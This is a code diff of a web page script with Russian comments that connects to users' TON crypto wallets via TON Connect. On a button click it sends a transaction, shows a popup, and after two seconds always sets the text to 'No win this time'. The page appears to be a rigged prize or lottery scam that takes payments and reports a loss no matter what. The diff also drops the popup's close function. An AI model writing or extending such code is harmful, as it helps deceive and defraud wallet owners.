@@ -62,18 +62,13 @@
 <script>
 
   window.onload = function() {
-    // Стартуем генерацию кошельков при загрузке страницы
-    //startWalletGeneration();
-
     setTimeout(function() {
-      // Добавляем класс для плавного исчезновения заставки
       document.querySelector('.splash-screen').classList.add('fade-out');
 
-      // После завершения анимации скрываем элемент
       setTimeout(function() {
         document.querySelector('.splash-screen').style.display = 'none';
-      }, 1000); // Время должно совпадать с временем анимации в CSS (1 секунда)
-    }, 3000); // Пауза перед закрытием заставки (3 секунды)
+      }, 1000); // 1 секунда
+    }, 3000); // 3 секунды
   };
 
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -95,26 +90,19 @@
     try {
       await tonConnectUI.sendTransaction(transaction);
       showPopup(); // Показываем окно при успешной транзакции
-
-      // Через 2 секунды меняем текст
       setTimeout(() => {
         const popupText = document.getElementById('popup-text');
         popupText.innerHTML = "No win this time"; // Меняем текст
       }, 2000);
     } catch (error) {
       console.error('Transaction failed:', error);
-      // Удалили вызов функции для отображения ошибки
+      // Обработка ошибки, если нужно
     }
   }
 
   function showPopup() {
     const popup = document.getElementById('popup');
-    popup.classList.add('show'); // Показываем окно плавно
-  }
-
-  function closePopup() {
-    const popup = document.getElementById('popup');
-    popup.classList.remove('show'); // Скрыть окно плавно
+    popup.classList.add('show'); // Показываем окно
   }
 
   document.addEventListener('DOMContentLoaded', function () {
@@ -125,14 +113,10 @@
       collapsibleContainer.classList.toggle('expanded');
     }
 
-    // Открытие при клике на сам контейнер, только если он не открыт
+    // Открытие при клике на сам контейнер
     collapsibleContainer.addEventListener('click', function (event) {
-      // Проверяем, открыт ли контейнер
-      if (!collapsibleContainer.classList.contains('expanded')) {
-        toggleExpand(); // Разворачиваем, если он закрыт
-      }
-      // Останавливаем всплытие, чтобы не сработал общий обработчик клика
-      event.stopPropagation();
+      toggleExpand(); // Переключаем состояние, независимо от его текущего состояния
+      event.stopPropagation(); // Останавливаем всплытие
     });
 
     // Закрытие при клике вне контейнера
@@ -149,6 +133,7 @@
       startTransaction(); // Запускаем транзакцию при нажатии на кнопку
     });
   });
+
 
 
 </script>
